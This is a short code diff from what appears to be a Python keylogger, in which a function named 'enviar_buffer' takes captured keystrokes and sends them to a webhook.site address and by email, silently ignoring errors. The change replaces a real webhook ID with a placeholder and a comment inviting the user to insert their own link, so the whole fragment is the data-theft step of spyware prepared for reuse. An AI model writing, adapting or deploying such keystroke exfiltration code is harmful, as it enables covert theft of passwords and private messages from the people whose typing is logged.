@@ -35,7 +35,7 @@ def enviar_buffer():
     if buffer:
         texto = ''.join(buffer)
         try:
-            requests.post("https://webhook.site/2bed1335-2a4b-4f00-bff5-fed0c2228f2d", data={"keys": texto})
+            requests.post("https://webhook.site/*****************", data={"keys": texto}) #<------ Your link in webhook
             enviar_correo(texto)
         except:
             pass
